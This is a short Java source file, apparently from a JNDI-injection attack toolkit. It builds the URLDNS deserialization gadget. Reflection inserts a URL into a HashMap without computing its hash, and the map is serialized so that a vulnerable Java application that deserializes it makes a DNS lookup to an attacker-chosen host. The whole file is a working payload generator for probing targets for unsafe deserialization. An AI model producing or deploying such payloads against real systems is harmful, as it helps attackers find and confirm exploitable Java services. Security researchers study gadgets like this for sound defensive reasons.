package map.jndi.gadget;

import map.jndi.util.SerializeUtil;

import java.lang.reflect.Method;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static byte[] create(String url) throws Exception {
        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        HashMap<Object, Object> map = new HashMap<>();
        Method putValMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);
        putValMethod.setAccessible(true);
        putValMethod.invoke(map, 0, new URL(url), 123, false, true);

        return SerializeUtil.serialize(map);
    }
}
